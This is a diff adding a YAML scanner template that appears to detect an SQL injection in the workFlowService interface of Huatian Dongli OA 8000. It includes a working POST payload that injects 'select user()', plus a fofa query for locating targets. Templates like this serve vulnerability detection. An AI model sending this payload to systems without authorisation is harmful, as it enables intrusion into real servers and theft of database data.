@@ -1,0 +1,30 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: "<buffalo-call> \n<method>getDataListForTree</method> \n<string>select user()</string> \n</buffalo-call>\n"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - <buffalo-reply>
+          - user()
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/OAapp/bfapp/buffalo/workFlowService'
+id: oa8000-workflowservice-sql-inject
+info:
+  author: zan8in
+  description: |-
+    华天动力OA 8000版 workFlowService接口存在SQL注入漏洞，攻击者通过漏洞可获取数据库敏感信息
+    fofa: app="华天动力-OA8000"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 华天动力OA 8000版 workFlowService SQL注入漏洞
+  severity: high
+  tags: oa,sql-inject,argus-import
